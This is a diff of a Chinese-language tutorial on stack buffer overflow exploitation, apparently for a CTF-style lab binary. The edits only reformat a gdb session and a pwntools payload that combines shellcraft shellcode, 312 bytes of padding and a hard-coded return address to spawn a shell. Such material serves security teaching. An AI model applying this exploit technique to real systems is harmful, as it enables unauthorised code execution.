@@ -106,7 +106,7 @@ $ disass unsafe
 $ b *0x080491a8
 $ r
 Overflow me
-<<IM HERE>>         <== This was my input
+<<IM HERE>>  <== This was my input
 $ x/20s $esp
 [...]
 0xffffd664:	"<<IM HERE>>"
@@ -164,12 +164,9 @@ p = process()
 现在我们可以使用 pwntools 出色的 shellcode 功能轻易的构建 shellcode 。
 
 ```python
-# 构建 Shellcode
-payload = asm(shellcraft.sh())
-# 溢出 Padding
-payload = payload.ljust(312, b'A')
-# 返回地址
-payload += p32(0xffffd664)
+payload = asm(shellcraft.sh())      # 构建 Shellcode
+payload = payload.ljust(312, b'A')  # 溢出 Padding
+payload += p32(0xffffd664)          # 返回地址
 ```
 
 现在让我们将其发送出去并使用 `p.interactive()` ，它使我们能够与 shell 通信。
